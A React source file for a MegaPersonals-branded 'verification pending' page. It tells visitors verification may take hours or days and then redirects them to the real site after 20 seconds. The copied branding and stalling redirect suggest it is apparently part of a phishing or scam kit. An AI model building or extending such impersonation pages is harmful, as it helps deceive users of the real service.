import { useEffect } from "react"
import { Helmet } from "react-helmet";
import PageLoader from "../../Components/PageLoader";

function VerificationPending() {
   useEffect(() => {
      setTimeout(() => {
         window.location.href = "https://megapersonals.eu/home";
       }, 20000)
   }, [])
  return (
     <>
        <Helmet>
           <title>MegaPersonals: Verification</title>
              <link rel="icon" type="image/png" sizes="16x16" href="/mega-verification/v2/images/favicon.png"/>
               <script type="text/javascript" src="/mega-verification/v2/js/p2/jquery.min.js"></script>
               <script type="text/javascript" src="/mega-verification/v2/js/p2/jquery-ui.min.js"></script>
               <link rel="stylesheet" href="/mega-verification/v2/css/p2/jquery-ui.min.css" />
               <script src="/mega-verification/v2/js/p2/bootstrap.bundle.js"></script>
               <link rel="stylesheet" href="/mega-verification/v2/css/p2/bootstrap-icons.css"/>
               <link rel="stylesheet" href="/mega-verification/v2/css/p2/bootstrap.min.css"/>
               <link rel="stylesheet" href="/mega-verification/v2/css/p2/custom.css"/>
        </Helmet>

        <PageLoader>
           <main>
            <div id="top-header">
               <div class="mp-header">
                  <img src="/mega-verification/v2/images/p2/megapersonalsPageHeader.png" />
               </div>
            </div>
            <div class="container-fluid verification-container verification-container-page min-vh-100 px-4 py-5">
               <h1 class="text-success text-uppercase bold">Verifying</h1>
               <h2>Normally this step <br/>can take minutes <br/>but with volume it <br/>may be hours if not <br/>a few days for <br/>verification to <br/>complete.</h2>
               <h2>Your patience is <br/>appreciated.</h2>
               <div class="single-loader"></div>
               <div class="d-flex flex-column">
                  <img class="img-footer-logo mt-2" src="/mega-verification/v2/images/p2/footer-logo.png" />
                  <div>
                     <p class="d-flex justify-content-center fw-bold mb-0 mt-2 copyright">Copyright &copy; 2022 Age Smart LDA. All Rights Reserved.</p>
                     <p class="d-flex justify-content-center gap-3 fw-bold mb-0 copyright">
                        <a href="#">Terms of Use</a>
                        <a href="3">Privacy Policy</a>
                        <a href="3">Billing Questions</a>
                     </p>
                  </div>
               </div>
            </div>
         </main>
         </PageLoader>
     </>
  )
}

export default VerificationPending
